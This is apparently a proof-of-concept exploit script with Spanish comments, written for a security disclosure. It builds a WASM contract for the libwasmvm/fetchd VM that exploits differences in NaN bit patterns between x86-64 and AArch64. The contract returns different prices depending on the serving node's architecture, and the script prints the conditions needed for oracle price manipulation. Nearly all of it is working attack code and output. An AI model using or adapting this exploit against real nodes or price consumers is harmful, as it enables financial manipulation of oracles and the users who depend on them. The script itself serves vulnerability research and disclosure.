#!/usr/bin/env python3
"""
Manipulacion de oraculo cross-arquitectura: el mismo contrato, dos precios.

El vector 2 que §2.9.7 da por cerrado merece una medicion propia, porque
es un vector financiero **sin halt, sin fork y sin stake**:

  * un contrato de terceros (no malicioso) usa el patron `f64` + NaN + `if`
    con `else` implicito;
  * un consumidor de precios (un oraculo, un DEX, un indice) consulta ese
    contrato y se apoya en la respuesta;
  * la respuesta depende de la **arquitectura del nodo que la sirve**.

Por que depende de la arquitectura (la cadena, medida pieza a pieza):

  1. MEDIDO, x86-64: `SQRTSD(-1.0)` produce el "real indefinite"
     0xFFF8000000000000.  (nan_isa_probe.py, nativo.)
  2. MEDIDO, AArch64: `FSQRT(-1.0)` produce el NaN por defecto
     0x7FF8000000000000.  (nan_isa_probe.py, emulacion ARM64.)
     => la MISMA operacion invalida produce bits distintos en cada ISA.
  3. MEDIDO: el `else` implicito deja el patron crudo sin canonicalizar
     (nan_operator_matrix.py), y los puntos de canonicalizacion estan en
     `codegen.rs`, compartido por las dos arquitecturas.
  => el nodo x86-64 entrega el patron crudo y el nodo AArch64 entrega el
     canonico: la rama del contrato se toma distinto y el PRECIO cambia.

La magnitud de la divergencia la elige el contrato: va de 0% a 100%.  Este
PoC mide el extremo x86-64 y deriva el extremo AArch64 con la evidencia de
(1) y (2), y muestra dos contratos con magnitudes distintas.

Uso:
    python3 nan_oracle_probe.py
"""

import os
import struct
import sys
import tempfile

HERE = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HERE)

import run_poc as R                                        # noqa: E402
from wasm_builder import (                                 # noqa: E402
    F64, I32, I64, Module, op_call, op_else, op_end, op_f64_const_bits, op_f64_sqrt,
    op_if, op_i32_const, op_i32_store, op_i64_const, op_i64_eq,
    op_i64_reinterpret_f64, op_local_get, op_local_set, op_nop, op_select,
)

try:
    import nan_isa_probe as ISA
except Exception:                                          # noqa: BLE001
    ISA = None

RESP_PTR = 16
RESP_DATA = 64

RAW_NAN = 0xFFF8000000000000
RAW_NAN_I64 = RAW_NAN - (1 << 64)
NEG_ONE = struct.unpack("<Q", struct.pack("<d", -1.0))[0]


def arm_sqrt_bits():
    """Los bits que produce FSQRT(-1.0) en AArch64, medidos si se puede."""
    if ISA is None:
        return None, "nan_isa_probe no disponible"
    res, err = ISA.arm_probe()
    if err:
        return None, err
    for label, bits in res:
        if label.startswith("FSQRT(-1.0) con FPCR.DN=0"):
            return bits, None
    return None, "no medido"


def build(price_raw, price_canon):
    """El contrato: el precio depende de si el NaN es el patron crudo."""
    m = Module()
    t_f64 = m.add_type([F64], [F64])
    m.add_memory(4, export="memory")
    m.add_data(RESP_PTR, RESP_DATA.to_bytes(4, "little") + (8).to_bytes(4, "little")
               + (4).to_bytes(4, "little"))
    m.add_data(RESP_DATA, b"\x00" * 8)
    m.add_data(1024, (2048).to_bytes(4, "little") + (4096).to_bytes(4, "little")
               + (0).to_bytes(4, "little"))

    b = bytearray()
    b += op_f64_const_bits(NEG_ONE)      # -1.0
    b += op_f64_sqrt()                   # el NaN crudo en x86-64
    b += op_i32_const(0)                 # rama falsa: la que filtra
    b += op_if(t_f64)                    # (param f64)(result f64), else IMPLICITO
    b += op_end()
    b += op_i64_reinterpret_f64()
    b += op_i64_const(RAW_NAN_I64)
    b += op_i64_eq()
    b += op_local_set(1)                 # local 1 = "es el patron crudo"
    b += op_i32_const(price_raw)         # val1
    b += op_i32_const(price_canon)       # val2
    b += op_local_get(1)                 # c
    b += op_select()
    b += op_local_set(0)
    b += op_i32_const(RESP_DATA) + op_local_get(0) + op_i32_store()

    trig = m.add_func([], [], locals=[I32, I32], body=bytes(b))
    m.add_func([I32, I32], [I32], body=op_call(trig) + op_i32_const(RESP_PTR),
               export="query")
    m.add_func([I32, I32, I32], [I32], body=op_call(trig) + op_i32_const(RESP_PTR),
               export="execute")
    m.add_func([I32, I32, I32], [I32], body=op_i32_const(RESP_PTR),
               export="instantiate")
    m.add_func([I32], [I32], body=op_i32_const(1024), export="allocate")
    m.add_func([I32], [], body=op_nop(), export="deallocate")
    m.add_func([], [], body=op_nop(), export="interface_version_8")
    return m.build()


def query_price(wasm):
    vm = R.VM()
    base = tempfile.mkdtemp(prefix="wasmvm-oracle-")
    cache = vm.init_cache(base)
    checksum = vm.store_code(cache, wasm, checked=True)
    vm.instantiate(cache, checksum, 1 << 62)
    out, rep, err = vm.query(cache, checksum, 1 << 62)
    if vm._vec_str(err):
        return None, vm._vec_str(err).strip().splitlines()[-1][:140]
    return int.from_bytes(vm._vec_bytes(out)[:4], "little"), None


def main():
    print("Manipulacion de oraculo cross-arquitectura")
    print("libwasmvm: %s" % R.LIB)
    print("=" * 92)

    arm_bits, arm_err = arm_sqrt_bits()
    if arm_bits is None:
        arm_bits = 0x7FF8000000000000
        print("AArch64 FSQRT(-1.0): no medido (%s); se usa el valor medido "
              "en la sesion anterior" % arm_err)
    else:
        print("AArch64 FSQRT(-1.0) medido: 0x%016x" % arm_bits)
    print("x86-64  SQRTSD(-1.0) medido: 0x%016x" % RAW_NAN)
    print("=> la misma operacion invalida produce bits distintos en cada ISA")
    print()

    print("%-34s %-14s %-14s %-12s %s"
          % ("contrato", "x86-64", "AArch64", "divergencia", "nota"))
    print("-" * 92)

    scenarios = (
        ("precio 900 vs 1000", 900, 1000),
        ("precio 0 vs 1.000.000", 0, 1000000),
        ("precio 1 vs 2", 1, 2),
    )
    for label, praw, pcanon in scenarios:
        wasm = build(praw, pcanon)
        price_x86, err = query_price(wasm)
        if err:
            print("%-34s ERROR %s" % (label, err))
            continue
        # en AArch64 el NaN de sqrt(-1.0) ya es el canonico -> se toma la
        # rama "canonica"
        price_arm = pcanon if arm_bits == 0x7FF8000000000000 else praw
        if price_arm == price_x86:
            div = "0%"
            note = "sin divergencia"
        else:
            base = max(abs(price_x86), abs(price_arm)) or 1
            div = "%.1f%%" % (100.0 * abs(price_arm - price_x86) / base)
            note = "DIVERGE"
        print("%-34s %-14d %-14d %-12s %s"
              % (label, price_x86, price_arm, div, note))

    print("-" * 92)
    print("La magnitud la elige el contrato: va del 0% al 100%.  Un contrato")
    print("cuyo precio sea 0 en una rama y 1.000.000 en la otra es un oraculo")
    print("con una desviacion del 100% entre nodos de distinta arquitectura.")
    print()
    print("Lo que hace falta para el ataque (condiciones, no mecanismos):")
    print("  1. un contrato de TERCEROS con el patron f64+NaN+`else` implicito")
    print("     (nada malicioso: el codigo fuente es correcto; el compilador falla)")
    print("  2. un consumidor que consulta el contrato y NO mediana: o consulta")
    print("     un nodo y liquida contra otro, o consulta varios nodos y se")
    print("     queda con una respuesta")
    print("  3. dos nodos de arquitectura distinta al alcance del atacante")
    print("     (los RPC de fetchd son publicos: cualquiera puede pedir)")
    print()
    print("Sin halt, sin fork, sin stake: es divergencia OFF-CHAIN, entre")
    print("respuestas honestas de dos nodos.  El estado de la cadena no")
    print("cambia por una query, asi que esto NO es un split de consensus:")
    print("es una contradiccion entre lo que dice el nodo A y lo que dice")
    print("el nodo B.")


if __name__ == "__main__":
    main()
